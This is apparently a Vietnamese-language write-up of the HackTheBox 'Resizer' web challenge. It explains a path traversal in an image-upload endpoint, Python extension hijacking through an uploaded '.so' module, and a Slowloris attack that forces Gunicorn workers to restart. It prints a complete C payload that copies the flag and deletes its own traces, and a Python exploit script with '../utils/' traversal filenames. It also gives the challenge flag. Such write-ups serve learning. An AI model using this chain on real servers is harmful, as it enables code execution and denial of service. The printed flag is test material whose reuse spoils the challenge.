---
title: "Resizer"
password: "HTB{7f3a6cd2af4ac2fd8bc47710679b98bd}"
date: 2026-04-23
platform: "HackTheBox"
category: "Web"
difficulty: "Hard"
tags: ["web", "hackthebox"]
draft: false
---

# Resizer
## Challenge Information
- **Category**: Web Exploitation
- **Event**: none
- **Author**: [F0DH1L](https://app.hackthebox.com/users/1460204)
- **Difficulty**: Hard
- **URL**: https://app.hackthebox.com/challenges/Resize
- **Tags**: #web #GunicornSlowloris #Path_Traversal #PythonExtensionHijacking
---
## 1. Description
>a simple website to resize pictures, there is no way you can hack it
## 2. Overview
Một kỹ thuật rất mới mà gần đây mình học được, bài này lợi dụng path traversal để upload file `.so` (không có trong blacklist) và sử dụng kỹ thuật python extension hijacking để ép server phải nạp file độc ta gửi lên và nhả flag.
## 3. Source Code Analysis
Vì là một web challenge nên mình sẽ trải nghiệm các chức năng của web trước:

![](./images/Pasted%20image%2020260422075111.png)

--> Dựa vào giao diện ta cũng có thể đoán được đây là một dịch dụ web dùng để resize ảnh, sẽ có các chức năng cơ bản như upload image, resize,...

Để hiểu rõ luồng và các chức năng hơn thì ta sẽ xem source code luôn, source map như sau:

```
Resizer/
├── challenge/              
│   ├── app.py              # file chạy chính
│   ├── config/             # các file cấu hình
│   │   └── supervisord.conf
│   ├── templates/          
│   │   ├── index.html      # trang công cụ resize
│   │   └── landing.html    # trang landing
│   ├── uploads/            # thư mục lưu trữ các ảnh upload
│   ├── utils/              # Backend utility modules
│   │   ├── helpers.py      # tính năng helper
│   │   └── resizer.py      # xử lý ảnh
│   ├── flag.txt            # target của bài
│   └── requirements.txt   
├── Dockerfile               
└── build-docker.sh        
```

Đầu tiên mình sẽ kiểm tra các file cấu hình của server, bắt đầu với `/config/supervisord.conf`:

![](./images/Pasted%20image%2020260422082800.png)

Vì thấy một lệnh khá lạ nên mình cũng tra cứu luôn, được biết "Gunicorn là một WSGI HTTP server thường được sử dụng trong môi trường production để phục vụ các ứng dụng web Python vì nó mạnh mẽ và có khả năng xử lý nhiều kết nối cùng lúc tốt hơn so với server mặc định đi kèm với các framework". 

Và flag `--worker 5` cho ta biết Gunicorn sẽ tạo ra 5 process chạy song song để xử lý các request cho server.

Sau khi đọc lướt qua các thư viện và file liên quan đến config thì mình cũng xác định được các tech stack như sau: server dùng Python 3.12, framework Flask, thư viện ảnh PIL (Pillow), chạy trên Gunicorn gồm 5 workers chạy song song và được quản lý bởi Supervisord.

Và trong thư viện PIL lại dính một lỗ hổng buffer overflow khá nghiêm trọng liên quan đến upload ảnh:

![](./images/Pasted%20image%2020260422085502.png)

Cụ thể, lỗi này nằm sâu trong phần code C của Pillow, tại file `_imagingcms.c`. Trong quá trình viết mã, các dev đã sử dụng hàm `strcpy` (hàm sao chép chuỗi không giới hạn) thay vì hàm an toàn hơn là `strncpy` (hàm có giới hạn độ dài) --> Buffer Overflow. Đọc thêm tại [ĐÂY](https://access.redhat.com/security/cve/cve-2024-28219) (Nhưng mình chỉ biết vậy còn exploit thế nào thì phải đọc code tiếp :v)

Các file `/utils/helpers.py` (có thư viện PIL nhưng mình vẫn chưa biết cách exploit) và `/utils/resizer` với các chức năng cơ bản nên vẫn chưa có gì chú ý:

![](./images/Pasted%20image%2020260422112050.png)

![](./images/Pasted%20image%2020260422112126.png)

Kiểm tra file `app.py`, ta dễ dàng phát hiện lỗ hổng Path Traversal thông qua endpoint `/resize` như sau:

![](./images/Pasted%20image%2020260422091605.png)

--> Từ Path Traversal ta có thể dễ dàng dùng cách syntax `../` để thoát khỏi thư mục `/uploads` để truy cập vào các mục khác trong hệ thống.  Test luôn:

![](./images/Pasted%20image%2020260422113946.png)

*(Mặc dù lỗi 500 nhưng chứng tỏ web đã gọi thư viện xử lý ảnh đọc file text -> lỗi)*

Lúc này mình cũng đã nghĩ đến việc gửi một request filename là `../flag.txt` để đọc flag nhưng nếu easy thế thì bài này đã không hard =)) Cụ thể thì các file upload lên chỉ có quyền ghi chứ không có quyền đọc, nếu mình upload một file kiểu `../flag.txt` thì nội dung sẽ ghi đè lên flag cũ. 

Thế thì có thể ghi đè lên các file khác để thay đổi logic rồi cố tình tạo ra lỗ hổng để lấy flag không =)) (đây cũng là câu hỏi trong đầu mình sau khi nghĩ biết ứng dụng có quyền ghi). Nhưng thực tế thì tác giả đã cho đoạn code check như sau;

```python
if os.path.exists(filepath):
	return "File already exists. Please rename your file and try again.", 400
```

--> Chặn luôn đường ghi đè :vv

Tiếp tục đọc file này, kéo lên một chút ta sẽ thấy các blacklist mà `/resize` chặn:

![](./images/Pasted%20image%2020260422094040.png)

Trong danh sách này thì tác giả đã chặn phần lớn các extention và content type nguy hiểm chủ yếu liên quan đến Python bytecode, nhưng lại bỏ sót đuôi `.so`. Có thể tham khảo thêm tại ĐÂY

Có lẽ tác giả quên rằng Python có tính năng cho phép import trực tiếp các file `.so` (coi như là các thư viện C mở rộng) để sử dụng như một module bình thường. Kết hợp với tính năng upload file thì ta hoàn toàn có thể viết gì đó bằng C sau đó biên dịch ra file `.so` để upload lên hệ thống với mục đích ghi đè file gốc. Lỗ hổng này còn được biết đến với tên **Python Extension Hijacking**.

Nhưng làm sao để server nạp file `.so` mà không phải các file gốc, ta sẽ phải đào sâu hơn một chút xuống tầng kiến trúc máy tính. Khi ta upload thành công file `resizer.so` vào máy chủ, file đó mới chỉ nằm trên **Ổ cứng**. Nhưng app lại đang chạy trên **RAM**.

---
*Tham khảo Gemini (đã kiểm tra nguồn)*:
**Cơ chế `sys.modules` của Python:** Trong Python, việc `import` là một thao tác cực kỳ tốn kém (phải tìm file, đọc file, biên dịch ra bytecode, rồi mới chạy). Để tối ưu, Python có một từ điển (dictionary) nội bộ tên là `sys.modules` đóng vai trò như một bộ nhớ đệm (Cache).

- **Lần đầu tiên** ứng dụng gặp lệnh `from utils.resizer import resizer`: Python sẽ lục tung ổ cứng, tìm file `resizer.py`, nạp nó vào RAM và lưu vào `sys.modules['utils.resizer']`.
    
- **Những lần sau:** Dù có 1000 người truy cập, Python chỉ việc móc hàm `resizer` từ trong RAM (`sys.modules`) ra dùng. Nó tuyệt đối không bao giờ nhìn xuống ổ cứng nữa.

Và Gunicorn đang có 5 con Worker chạy song song, 5 con này cũng đã nạp sẵn file `resizer.py` của vào `sys.modules` của chúng nên ta không có cách nào ghi đè được.

---

Nếu vậy thì làm sao để Python chịu lấy file độc mà ta up lên =)) Cách nghĩ rất tự nhiên là giết chết chương trình cũ để app tự khởi động lại và nạp file mới =))) Ban đầu mình nghĩ đây là ý tưởng điền rồ :vv nhưng thật ra nó vẫn có thật.

Và sau khi tham khảo các nguồn (có cả AI) thì mình thấy khi khởi động lại, Gunicorn Master sẽ tạo ra một Worker hoàn toàn mới, con Worker mới này sẽ có RAM mới luôn và khi gặp lệnh `import utils.resizer`, nó buộc phải lấy từ ổ cứng, và bây giờ nó sẽ ăn file `.so` mà ta đã upload lên từ trước (còn vì sao python lại ưu tiên file `.so` hơn thì mình nghĩ các bạn có thể tự tìm hiểu vì dài quá :v).

Vì sao là `utils/resizer` mà không phải `os`? (Bài toán [Pre-fork](https://www.rippling.com/blog/rippling-gunicorn-pre-fork-journey-memory-savings-and-cost-reduction) của Gunicorn): Khi ta chạy Gunicorn, nó sẽ luôn khởi động tiến trình mẹ trước (gọi là Master), sau đó nó sẽ chuẩn bị mọi thứ, import các thư viện gốc (kể cả file os.py chuẩn). Sau đó nó mới nhân bản để gọi ra các tiến trình con (Worker) -> Các Worker sẽ luôn sạch.

Nhưng Master chỉ lo việc quản lý mà không quan tâm các logic Worker có gì. Mà các tiến trình Master lại không import `utils.resize` (vì đây là logic của Worker) -> Khi Worker chạy nó sẽ buộc phải nhìn xuống ổ cứng để import các file này vào -> Kết quả sẽ lấy trúng mã độc của ta.
## 4. Exploitation
Script lấy cờ bằng C code:

```c
#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <stdio.h>
#include <unistd.h>

PyMODINIT_FUNC PyInit_resizer(void) {
    FILE *in = fopen("/app/flag.txt", "rb");
    if (!in) in = fopen("flag.txt", "rb");
    if (in) {
        // Ghi sẵn cờ ra tên file
        FILE *out = fopen("/app/uploads/kyrux_resized.jpg", "wb");
        if (out) {
            char buf[1024];
            size_t n;
            while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
                fwrite(buf, 1, n, out);
            }
            fclose(out);
        }
        fclose(in);
    }
    
    // Xóa dấu vết để chương trình không bị crash luôn =))
    unlink("/app/utils/resizer.so");
    unlink("/app/utils/resizer.cpython-312-x86_64-linux-gnu.so");
    unlink("/app/utils/resizer.cpython-312-aarch64-linux-gnu.so");
    
    return NULL; // Ép crash worker hiện tại
}
```

Dùng Docker để tạo file `.so` phù hợp với phiên bản os của web:

```shell
docker run --rm -v $(pwd):/src python:3.12-slim sh -c "apt-get update && apt-get install -y gcc python3-dev && cd /src && gcc -shared -o resizer.so -fPIC -I/usr/local/include/python3.12 resizer.c"
```

![](./images/Pasted%20image%2020260422111045.png)

Dựa vào những thông tin trên thì mình có thể viết script khai thác theo hướng như sau:

Upload file `resize.so` bằng endpoint `/resize` và lợi dụng Path Traversal để nhảy vào thư mục `/utils` --> làm treo 5 con Worker để từ đó buộc chúng nó phải tự hủy và khởi động lại --> Trigger script `.so` để lấy flag.

Ta sẽ dùng kỹ thuật Slowloris để lừa Gunicore. Nếu Gunicorn chưa nhận được `\r\n\r\n`, nó mặc định hiểu rằng gói tin vẫn chưa gửi Header xong. Mình sẽ mở kết nối, gửi một nửa Header và không gửi `\r\n\r\n`. Gunicorn sẽ đứng đợi Header và treo đó mãi -> treo Worker và sau 30s sẽ tự chết. Tham khảo thêm tại [ĐÂY](https://gunicorn.org/reference/settings/#max_requests_jitter)

![](./images/Pasted%20image%2020260422110300.png)

Script như sau:

```python
import requests
import socket
import time

TARGET_URL = "http://154.57.164.65:30938"

print("[1] Đang tải payload")
with open('resizer.so', 'rb') as f:
    file_data = f.read()

# Gửi cả 3 loại cho chắc =)) (kết hợp Path Traversal)
payloads = [
    "../utils/resizer.so",
    "../utils/resizer.cpython-312-x86_64-linux-gnu.so",
    "../utils/resizer.cpython-312-aarch64-linux-gnu.so"
]

for p in payloads:
    files = {'file': (p, file_data, 'application/octet-stream')}
    requests.post(f"{TARGET_URL}/resize", files=files)

print("[2] Khởi chạy Slowloris để treo cứng 5 Workers")
host = TARGET_URL.split("//")[1].split(":")[0]
port = int(TARGET_URL.split(":")[2].split("/")[0]) if ":" in TARGET_URL.split("//")[1] else 80

sockets = []
try:
    for i in range(10):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        headers = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Fake-Header: " # cố tình không có \r\n\r\n ở cuối!
        )
        s.send(headers.encode())
        
        sockets.append(s)
        print(f"    -> Đã khóa Worker {i+1}/10")
        
    print("    [!] Đang chờ 35 giây để Master Gunicorn kill các worker...")
    time.sleep(35)
    
    for s in sockets:
        s.close()
except Exception as e:
    pass

# Chờ cho Master có thời gian boot lại worker an toàn sau khi mã độc sập
print("[3] Các worker đã khởi động, tạo cờ, sập và tự hủy mã độc. Đang chờ worker mới boot lên...")
time.sleep(5) 

print("[4]...")
# Gửi request bình thường, app sẽ lấy file cờ kyrux_resized.jpg trả về!
files = {'file': ('kyrux.jpg', b"fake", 'image/jpeg')}
req = requests.post(f"{TARGET_URL}/resize", files=files)

print("[+] FLAG:")
print(req.text.strip())
```

Lấy flag:

![](./images/Pasted%20image%2020260422110623.png)

>`HTB{7f3a6cd2af4ac2fd8bc47710679b98bd}`

>h@ppy h@ck!n9 
>*(BKSEC)*
